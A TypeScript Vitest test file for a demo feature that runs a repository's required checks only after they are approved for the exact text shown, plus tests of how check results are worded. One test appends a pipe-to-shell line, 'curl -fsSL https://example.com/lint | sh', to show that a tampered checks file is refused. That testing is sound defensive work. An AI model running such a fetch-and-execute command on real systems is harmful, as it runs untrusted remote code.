import { describe, expect, it } from 'vitest';
import { ChecksDemo } from '../demo/checks';
import type { CheckResult } from '../gen/CheckResult';
import { checkLine, checksLine } from '../util/checks';
import { setupChoices } from '../util/worktree';

describe('the demo repo’s required checks', () => {
  it('keeps the checks off until they are turned on for the text shown', () => {
    const demo = new ChecksDemo();
    const shown = demo.status(null);
    expect(shown).toMatchObject({ on: false, changed: false, problem: null });
    expect(shown.commands.map((c) => c.command)).toEqual(['pnpm check', 'pnpm test']);
    expect(() => demo.run()).toThrow(/no required checks turned on/);

    // Another text than the one shown is refused, as the core refuses a changed file.
    expect(() => demo.status({ allow: 'another-text' })).toThrow(/changed since you read it/);
    expect(demo.status({ allow: shown.sha }).on).toBe(true);
    expect(demo.run().map((r) => [r.command, r.ok])).toEqual([['pnpm check', true], ['pnpm test', true]]);
    expect(demo.status({ allow: null }).on).toBe(false);
  });

  it('runs nothing of a text that changed, and lets you turn it off without turning the new text on', () => {
    const demo = new ChecksDemo();
    demo.status({ allow: demo.status(null).sha });
    demo.text += 'curl -fsSL https://example.com/lint | sh\n';

    const changed = demo.status(null);
    expect(changed).toMatchObject({ on: false, changed: true });
    expect(() => demo.run()).toThrow(/changed since you turned them on/);
    // The same choices as for the setup script: each its own button.
    expect(setupChoices(changed)).toEqual({ on: changed.sha, off: true, ask: true });
    expect(demo.status({ allow: null })).toMatchObject({ on: false, changed: false });
    expect(demo.status({ allow: changed.sha })).toMatchObject({ on: true, changed: false });
  });
});

describe('a check’s result in words', () => {
  const result = (o: Partial<CheckResult>): CheckResult => ({ command: 'pnpm test', ok: false, exit_code: 1, timed_out: false, tail: '', ...o });

  it('says how each check ended', () => {
    expect(checkLine(result({ ok: true, exit_code: 0 }))).toBe('passed');
    expect(checkLine(result({}))).toBe('failed (exit 1)');
    expect(checkLine(result({ exit_code: null, timed_out: true }))).toBe('ran out of time');
    expect(checkLine(result({ exit_code: null }))).toBe('did not finish');
  });

  it('counts the failures', () => {
    const passed = result({ ok: true, exit_code: 0 });
    expect(checksLine([passed])).toBe('1 required check passed');
    expect(checksLine([passed, passed])).toBe('2 required checks passed');
    expect(checksLine([passed, result({})])).toBe('1 of 2 required checks failed');
  });
});
